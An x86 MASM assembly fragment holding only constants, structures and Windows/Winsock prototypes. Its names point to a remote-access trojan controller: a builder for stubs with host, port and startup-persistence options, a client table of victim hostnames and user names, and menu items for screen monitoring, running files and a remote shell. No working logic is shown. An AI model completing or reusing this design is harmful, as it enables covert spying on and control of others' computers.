.386
.model flat, stdcall
option casemap:none

NULL                    equ 0
TRUE                    equ 1
FALSE                   equ 0
SW_SHOWNORMAL           equ 1
SW_HIDE                 equ 0
IDC_ARROW               equ 32512
BLACK_BRUSH             equ 4
WHITE_BRUSH             equ 0
CS_HREDRAW              equ 1
CS_VREDRAW              equ 2
MF_SEPARATOR            equ 0800h
MF_STRING               equ 0
MF_ENABLED              equ 0
MF_GRAYED               equ 1
GENERIC_WRITE           equ 40000000h
GENERIC_READ            equ 80000000h
CREATE_ALWAYS           equ 2
FILE_ATTRIBUTE_NORMAL   equ 80h
INVALID_HANDLE_VALUE    equ -1
TPM_LEFTALIGN           equ 0
COLOR_BTNFACE           equ 15

WS_OVERLAPPEDWINDOW     equ 000CF0000h
WS_VISIBLE              equ 010000000h
WS_CHILD                equ 040000000h
WS_BORDER               equ 000800000h
WS_VSCROLL              equ 000200000h
WS_HSCROLL              equ 000100000h
WS_TABSTOP              equ 000010000h
WS_EX_CLIENTEDGE        equ 000000200h
WS_CLIPCHILDREN         equ 002000000h
CW_USEDEFAULT           equ 080000000h

WM_CREATE               equ 001h
WM_DESTROY              equ 002h
WM_SIZE                 equ 005h
WM_PAINT                equ 00Fh
WM_CLOSE                equ 010h
WM_COMMAND              equ 0111h
WM_NOTIFY               equ 04Eh
WM_INITDIALOG           equ 0110h
WM_TIMER                equ 0113h
WM_USER                 equ 0400h

IDM_BUILDER             equ 1004
IDM_ABOUT               equ 1005

IDC_BTN_BUILDER         equ 7001
IDC_BTN_ABOUT           equ 7002
BTN_BAR_H               equ 28

IDM_CTX_MONITOR         equ 2002
IDM_CTX_RUNFILE         equ 2006
IDM_CTX_DISCONNECT      equ 2007
IDM_CTX_SHELL           equ 2008

IDD_BUILDER             equ 3000
IDC_EDIT_HOST           equ 3001
IDC_EDIT_PORT           equ 3002
IDC_CHK_STARTUP         equ 3003
IDC_CHK_SHELLDIR        equ 3004
IDC_BTN_BUILD           equ 3006

IDD_PORT                equ 3100
IDC_PORT_EDIT           equ 3101
IDC_PORT_OK             equ 3102

IDC_LISTVIEW            equ 4001
IDC_STATUSBAR           equ 4002
TIMER_STALE_CHECK       equ 5001

IDI_MAINICON            equ 100
IDR_STUB_ASM            equ 200
IDR_STUB_RC             equ 201
IDR_STUB_MAN            equ 202
RT_RCDATA               equ 10

LVS_REPORT              equ 0001h
LVS_SINGLESEL           equ 0004h
LVS_SHOWSELALWAYS       equ 0008h
LVS_EX_FULLROWSELECT    equ 00000020h
LVS_EX_GRIDLINES        equ 00000001h
LVS_EX_HEADERDRAGDROP   equ 00000010h

LVM_FIRST               equ 1000h
LVM_INSERTCOLUMNA       equ (LVM_FIRST + 27)
LVM_INSERTITEMA         equ (LVM_FIRST + 7)
LVM_SETITEMA            equ (LVM_FIRST + 6)
LVM_DELETEITEM          equ (LVM_FIRST + 8)
LVM_DELETEALLITEMS      equ (LVM_FIRST + 9)
LVM_GETITEMCOUNT        equ (LVM_FIRST + 4)
LVM_GETNEXTITEM         equ (LVM_FIRST + 12)
LVM_SETEXTENDEDLISTVIEWSTYLE equ (LVM_FIRST + 54)
LVM_SETBKCOLOR          equ (LVM_FIRST + 1)
LVM_SETTEXTCOLOR        equ (LVM_FIRST + 36)
LVM_SETTEXTBKCOLOR      equ (LVM_FIRST + 38)

LVCF_FMT                equ 0001h
LVCF_WIDTH              equ 0002h
LVCF_TEXT               equ 0004h
LVCF_SUBITEM            equ 0008h
LVCFMT_LEFT             equ 0000h
LVIF_TEXT               equ 0001h
LVNI_SELECTED           equ 0002h

ICC_LISTVIEW_CLASSES    equ 00000001h
ICC_BAR_CLASSES         equ 00000004h
NM_RCLICK               equ -5
SB_SETTEXTA             equ (WM_USER + 1)
SBARS_SIZEGRIP          equ 0100h

BS_DEFPUSHBUTTON        equ 0001h
BN_CLICKED              equ 0
ES_AUTOHSCROLL          equ 0080h
ES_AUTOVSCROLL          equ 0040h
ES_MULTILINE            equ 0004h
ES_READONLY             equ 0800h
ES_WANTRETURN           equ 1000h
ES_NUMBER               equ 2000h
EM_SETSEL               equ 00B1h
EM_REPLACESEL           equ 00C2h

IDC_SHELL_OUT           equ 6001
IDC_SHELL_IN            equ 6002
IDC_SHELL_BTN           equ 6003

GMEM_FIXED              equ 0
OPEN_EXISTING           equ 3
FILE_SHARE_READ         equ 1

MB_OK                   equ 0
MB_ICONINFORMATION      equ 040h
MB_ICONERROR            equ 010h
MB_YESNO                equ 004h
MB_ICONQUESTION         equ 020h
IDYES                   equ 6
IDOK                    equ 1
IDCANCEL                equ 2

AF_INET                 equ 2
SOCK_STREAM             equ 1
IPPROTO_TCP             equ 6
SOMAXCONN               equ 5
INVALID_SOCKET          equ -1
SOCKET_ERROR            equ -1
SOL_SOCKET              equ 0FFFFh
SO_REUSEADDR            equ 0004h
SO_ERROR                equ 1007h
SO_KEEPALIVE            equ 0008h
TCP_KEEPIDLE            equ 3
TCP_KEEPINTVL           equ 17
TCP_KEEPCNT             equ 16
MSG_PEEK                equ 2

OFN_FILEMUSTEXIST       equ 001000h
OFN_PATHMUSTEXIST       equ 000800h
OFN_HIDEREADONLY        equ 000004h
MAX_PATH                equ 260
INFINITE                equ 0FFFFFFFFh
STARTF_USESHOWWINDOW   equ 1h

WNDCLASSEX STRUCT
    cbSize          DWORD ?
    style           DWORD ?
    lpfnWndProc     DWORD ?
    cbClsExtra      DWORD ?
    cbWndExtra      DWORD ?
    hInstance       DWORD ?
    hIcon           DWORD ?
    hCursor         DWORD ?
    hbrBackground   DWORD ?
    lpszMenuName    DWORD ?
    lpszClassName   DWORD ?
    hIconSm        DWORD ?
WNDCLASSEX ENDS

POINT STRUCT
    x   DWORD ?
    y   DWORD ?
POINT ENDS

MSG STRUCT
    hwnd        DWORD ?
    message     DWORD ?
    wParam      DWORD ?
    lParam      DWORD ?
    time        DWORD ?
    pt          POINT <>
MSG ENDS

RECT STRUCT
    left    DWORD ?
    top     DWORD ?
    right   DWORD ?
    bottom  DWORD ?
RECT ENDS

NMHDR STRUCT
    hwndFrom    DWORD ?
    idFrom      DWORD ?
    code        DWORD ?
NMHDR ENDS

LVCOLUMNA STRUCT
    imask       DWORD ?
    fmt         DWORD ?
    lx          DWORD ?
    pszText     DWORD ?
    cchTextMax  DWORD ?
    iSubItem    DWORD ?
    iImage      DWORD ?
    iOrder      DWORD ?
LVCOLUMNA ENDS

LVITEMA STRUCT
    imask       DWORD ?
    iItem       DWORD ?
    iSubItem    DWORD ?
    state       DWORD ?
    stateMask   DWORD ?
    pszText     DWORD ?
    cchTextMax  DWORD ?
    iImage      DWORD ?
    lParam      DWORD ?
LVITEMA ENDS

INITCOMMONCONTROLSEX STRUCT
    dwSize  DWORD ?
    dwICC   DWORD ?
INITCOMMONCONTROLSEX ENDS

WSADATA STRUCT
    wVersion        WORD ?
    wHighVersion    WORD ?
    szDescription   BYTE 257 dup(?)
    szSystemStatus  BYTE 129 dup(?)
    iMaxSockets     WORD ?
    iMaxUdpDg       WORD ?
    lpVendorInfo    DWORD ?
WSADATA ENDS

sockaddr_in STRUCT
    sin_family  WORD ?
    sin_port    WORD ?
    sin_addr    DWORD ?
    sin_zero    BYTE 8 dup(?)
sockaddr_in ENDS

OPENFILENAMEA STRUCT
    lStructSize     DWORD ?
    hwndOwner       DWORD ?
    hInstance       DWORD ?
    lpstrFilter     DWORD ?
    lpstrCustomFilter DWORD ?
    nMaxCustFilter  DWORD ?
    nFilterIndex    DWORD ?
    lpstrFile       DWORD ?
    nMaxFile        DWORD ?
    lpstrFileTitle  DWORD ?
    nMaxFileTitle   DWORD ?
    lpstrInitialDir DWORD ?
    lpstrTitle      DWORD ?
    Flags           DWORD ?
    nFileOffset     WORD ?
    nFileExtension  WORD ?
    lpstrDefExt     DWORD ?
    lCustData       DWORD ?
    lpfnHook        DWORD ?
    lpTemplateName  DWORD ?
OPENFILENAMEA ENDS

BITMAPINFOHEADER STRUCT
    biSize          DWORD ?
    biWidth         DWORD ?
    biHeight        DWORD ?
    biPlanes        WORD ?
    biBitCount      WORD ?
    biCompression   DWORD ?
    biSizeImage     DWORD ?
    biXPelsPerMeter DWORD ?
    biYPelsPerMeter DWORD ?
    biClrUsed       DWORD ?
    biClrImportant  DWORD ?
BITMAPINFOHEADER ENDS

CAP_W               equ 800
CAP_H               equ 450
CAP_PIX             equ (CAP_W * 3 * CAP_H)
CAP_TOTAL           equ (CAP_PIX + 40)
WM_USER_FRAME       equ (WM_USER + 100)

MAX_CLIENTS             equ 256
CLIENT_ID_LEN           equ 64
CLIENT_STR_LEN          equ 128

MasonClient STRUCT
    active      DWORD ?
    sock        DWORD ?
    deviceID    BYTE CLIENT_ID_LEN dup(?)
    ip          BYTE CLIENT_STR_LEN dup(?)
    hostname    BYTE CLIENT_STR_LEN dup(?)
    osName      BYTE CLIENT_STR_LEN dup(?)
    userName    BYTE CLIENT_STR_LEN dup(?)
    winVer      BYTE CLIENT_STR_LEN dup(?)
MasonClient ENDS

STARTUPINFO_A STRUCT
    cb_             DWORD ?
    lpRes1          DWORD ?
    lpDesk          DWORD ?
    lpTtl           DWORD ?
    dwX_            DWORD ?
    dwY_            DWORD ?
    dwXSz           DWORD ?
    dwYSz           DWORD ?
    dwXCC           DWORD ?
    dwYCC           DWORD ?
    dwFill          DWORD ?
    dwFlg           DWORD ?
    wShow           WORD ?
    cbRes2          WORD ?
    lpRes2          DWORD ?
    hIn             DWORD ?
    hOut            DWORD ?
    hErr            DWORD ?
STARTUPINFO_A ENDS

PROCESS_INFO STRUCT
    hProc           DWORD ?
    hThr            DWORD ?
    dwPID           DWORD ?
    dwTID_          DWORD ?
PROCESS_INFO ENDS

fd_set STRUCT
    fd_count    DWORD ?
    fd_array    DWORD 64 dup(?)
fd_set ENDS

timeval STRUCT
    tv_sec      DWORD ?
    tv_usec     DWORD ?
timeval ENDS

GetModuleHandleA        PROTO :DWORD
ExitProcess             PROTO :DWORD
CreateThread            PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
CloseHandle             PROTO :DWORD
Sleep                   PROTO :DWORD
lstrlenA                PROTO :DWORD
lstrcpyA                PROTO :DWORD, :DWORD
lstrcmpA                PROTO :DWORD, :DWORD
CreateFileA             PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
WriteFile               PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
ReadFile                PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
GetFileSize             PROTO :DWORD, :DWORD
GlobalAlloc             PROTO :DWORD, :DWORD
GlobalFree              PROTO :DWORD
GetModuleFileNameA      PROTO :DWORD, :DWORD, :DWORD
GetFileAttributesA      PROTO :DWORD
VirtualAlloc            PROTO :DWORD, :DWORD, :DWORD, :DWORD
CopyFileA               PROTO :DWORD, :DWORD, :DWORD
CreateDirectoryA        PROTO :DWORD, :DWORD
DeleteFileA             PROTO :DWORD
RemoveDirectoryA        PROTO :DWORD
CreateProcessA          PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
WaitForSingleObject     PROTO :DWORD, :DWORD

RegisterClassExA        PROTO :DWORD
CreateWindowExA         PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
ShowWindow              PROTO :DWORD, :DWORD
UpdateWindow            PROTO :DWORD
GetMessageA             PROTO :DWORD, :DWORD, :DWORD, :DWORD
TranslateMessage        PROTO :DWORD
DispatchMessageA        PROTO :DWORD
DefWindowProcA          PROTO :DWORD, :DWORD, :DWORD, :DWORD
PostQuitMessage         PROTO :DWORD
PostMessageA            PROTO :DWORD, :DWORD, :DWORD, :DWORD
DestroyWindow           PROTO :DWORD
SendMessageA            PROTO :DWORD, :DWORD, :DWORD, :DWORD
MessageBoxA             PROTO :DWORD, :DWORD, :DWORD, :DWORD
LoadIconA               PROTO :DWORD, :DWORD
LoadCursorA             PROTO :DWORD, :DWORD
GetClientRect           PROTO :DWORD, :DWORD
MoveWindow              PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
CreatePopupMenu         PROTO
AppendMenuA             PROTO :DWORD, :DWORD, :DWORD, :DWORD
TrackPopupMenu          PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
EnableMenuItem          PROTO :DWORD, :DWORD, :DWORD
GetCursorPos            PROTO :DWORD
DialogBoxParamA         PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
EndDialog               PROTO :DWORD, :DWORD
GetDlgItem              PROTO :DWORD, :DWORD
GetDlgItemTextA         PROTO :DWORD, :DWORD, :DWORD, :DWORD
SetDlgItemTextA         PROTO :DWORD, :DWORD, :DWORD
SetWindowTextA          PROTO :DWORD, :DWORD
SetTimer                PROTO :DWORD, :DWORD, :DWORD, :DWORD
KillTimer               PROTO :DWORD, :DWORD
InvalidateRect          PROTO :DWORD, :DWORD, :DWORD
GetDlgItemInt           PROTO :DWORD, :DWORD, :DWORD, :DWORD
IsDlgButtonChecked      PROTO :DWORD, :DWORD
SetFocus                PROTO :DWORD
GetSystemMetrics        PROTO :DWORD
GetDC                   PROTO :DWORD
ReleaseDC               PROTO :DWORD, :DWORD
BeginPaint              PROTO :DWORD, :DWORD
EndPaint                PROTO :DWORD, :DWORD
DeleteObject            PROTO :DWORD
SelectObject            PROTO :DWORD, :DWORD
GetWindowTextA          PROTO :DWORD, :DWORD, :DWORD
GetWindowTextLengthA    PROTO :DWORD
InitCommonControlsEx    PROTO :DWORD
GetStockObject          PROTO :DWORD
StretchDIBits           PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
FindResourceA           PROTO :DWORD, :DWORD, :DWORD
SizeofResource          PROTO :DWORD, :DWORD
LoadResource            PROTO :DWORD, :DWORD
LockResource            PROTO :DWORD
GetOpenFileNameA        PROTO :DWORD

WSAStartup              PROTO :DWORD, :DWORD
WSACleanup              PROTO
socket                  PROTO :DWORD, :DWORD, :DWORD
bind                    PROTO :DWORD, :DWORD, :DWORD
listen                  PROTO :DWORD, :DWORD
accept                  PROTO :DWORD, :DWORD, :DWORD
closesocket             PROTO :DWORD
send                    PROTO :DWORD, :DWORD, :DWORD, :DWORD
recv                    PROTO :DWORD, :DWORD, :DWORD, :DWORD
htons                   PROTO :DWORD
inet_ntoa               PROTO :DWORD
setsockopt              PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
getsockopt              PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
WSAGetLastError         PROTO
select                  PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

wsprintfA               PROTO C :DWORD, :DWORD, :VARARG
